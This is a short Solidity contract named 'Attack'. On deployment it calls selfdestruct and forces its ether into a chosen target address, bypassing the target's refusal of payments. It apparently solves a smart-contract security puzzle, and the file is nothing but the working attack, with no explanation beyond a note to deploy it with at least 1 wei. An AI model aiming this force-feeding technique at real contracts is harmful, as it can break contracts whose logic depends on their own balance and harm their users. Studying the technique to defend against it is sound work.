//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @dev deploy with at least 1 wei
 */
contract Attack{
    constructor(address payable _force) payable {
        selfdestruct(_force);
    }
}